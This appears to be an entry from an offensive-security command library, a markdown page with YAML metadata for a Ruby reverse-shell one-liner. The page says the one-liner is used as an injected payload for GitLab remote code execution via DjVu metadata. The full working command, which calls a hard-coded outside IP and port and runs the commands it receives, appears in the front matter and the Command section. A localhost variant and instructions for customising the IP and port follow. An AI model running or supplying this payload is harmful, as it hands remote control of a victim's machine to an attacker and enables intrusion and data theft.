---
id: cmd-uuid-5
data: >-
  ruby -rsocket -e 'exit if
  fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
  io.read}end'
tags:
  - reverse-shell
  - rce-payload
type: command
output: Establishes TCP connection and executes commands received from listener
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.897Z'
verified: false
validated: true
submitted: true
---
# spawn-ruby-reverse-shell

## Command

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Description

Spawns a reverse shell using Ruby, connecting to attacker's IP/port and forwarding command execution/output, injected via qx{} in DjVu metadata for GitLab RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 103.3.61.137 | Attacker IP | Yes |
| 12345 | Listener port | Yes |

## Examples

### Basic Usage

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Advanced Usage

Customize IP/port in the one-liner.

## Expected Output

Silent execution; TCP connection established, shell interactive on listener.

## Related

- [[commands/id-display-user]]
- [[procedures/Verify-RCE-Impact-with-File-Write-or-Reverse-Shell]]
